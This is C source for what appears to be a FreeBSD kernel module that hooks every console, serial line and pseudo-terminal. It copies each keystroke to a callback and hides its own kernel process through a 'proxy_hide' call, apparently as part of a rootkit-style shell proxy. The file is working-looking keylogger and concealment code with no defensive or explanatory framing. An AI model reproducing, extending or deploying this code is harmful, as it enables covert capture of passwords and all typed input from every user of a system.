#include <sys/param.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/kernel.h>
#include <sys/kthread.h>
#include <sys/fcntl.h>
#include <sys/syscallsubr.h>
#include <sys/tty.h>
#include <sys/ttyhook.h>
#include <sys/ttydisc.h>
#include <sys/uio.h>

#include "ttylog.h"
#include "shellproxy.h"

#define TTYLOG_MAXTTY 128
#define TTYLOG_MAXPTS 64
#define TTYLOG_MAXVTY 12

struct ttylog_tty {
	struct tty* tp;
};

static struct ttylog_tty ttylog_seen[TTYLOG_MAXTTY];
static int ttylog_nseen;
static ttylog_input_t* ttylog_input;
static void* ttylog_arg;
static struct ttyhook ttylog_hook;
static volatile int ttylog_run;

static
void ttylog_input_data (const char* data, size_t len)
{
	if (ttylog_input!=NULL)
		ttylog_input(ttylog_arg, data, len);
}

static
int ttylog_rint (struct tty* tp, char c, int flags)
{
	struct ttyhook* hook = tp->t_hook;

	ttylog_input_data(&c, 1);
	tp->t_hook = NULL;
	int error = ttydisc_rint(tp, c, flags);
	tp->t_hook = hook;
	return (error);
}

static
void ttylog_close (struct tty* tp)
{
	for (int i=0; i<ttylog_nseen; i++) {
		if (ttylog_seen[i].tp!=tp)
			continue;
		ttylog_seen[i] = ttylog_seen[--ttylog_nseen];
		break;
	}
}

static
int ttylog_attach_path (const char* path)
{
	struct tty* tp = NULL;

	if (kern_openat(curthread, AT_FDCWD, path, UIO_SYSSPACE, O_RDONLY, 0)!=0)
		return (ENXIO);
	int fd = curthread->td_retval[0];
	int error = ttyhook_register(&tp, curthread->td_proc, fd, &ttylog_hook, NULL);
	kern_close(curthread, fd);
	if (error!=0)
		return (error);
	for (int i=0; i<ttylog_nseen; i++) {
		if (ttylog_seen[i].tp!=tp)
			continue;
		return (0);
	}
	if (ttylog_nseen>=TTYLOG_MAXTTY)
		return (ENOSPC);
	ttylog_seen[ttylog_nseen++].tp = tp;
	return (0);
}

static
void ttylog_scan (void)
{
	char path[32];

	for (int i=0; i<TTYLOG_MAXVTY; i++) {
		snprintf(path, sizeof(path), "/dev/ttyv%x", i);
		ttylog_attach_path(path);
	}
	ttylog_attach_path("/dev/ttyu0");
	for (int i=0; i<TTYLOG_MAXPTS; i++) {
		snprintf(path, sizeof(path), "/dev/pts/%d", i);
		ttylog_attach_path(path);
	}
}

static
void ttylog_thread (void* arg)
{
	(void)arg;
	proxy_hide(curthread->td_proc);
	while (ttylog_run) {
		ttylog_scan();
		tsleep((void*)&ttylog_run, PWAIT, "ttylog", hz/50);
	}
	kproc_exit(0);
}

int ttylog_start (ttylog_input_t* input, void* arg)
{
	ttylog_input = input;
	ttylog_arg = arg;
	ttylog_hook.th_rint = ttylog_rint;
	ttylog_hook.th_close = ttylog_close;

	ttylog_run = 1;
	int error = kproc_create(ttylog_thread, NULL, NULL, 0, 0, "ttylog");
	if (error!=0)
		ttylog_run = 0;
	return (error);
}

void ttylog_stop (void)
{
	ttylog_run = 0;
	wakeup((void*)&ttylog_run);
	for (int i=0; i<ttylog_nseen; i++) {
		struct tty* tp = ttylog_seen[i].tp;
		tty_lock(tp);
		ttyhook_unregister(tp);
		tty_unlock(tp);
	}
	ttylog_nseen = 0;
}
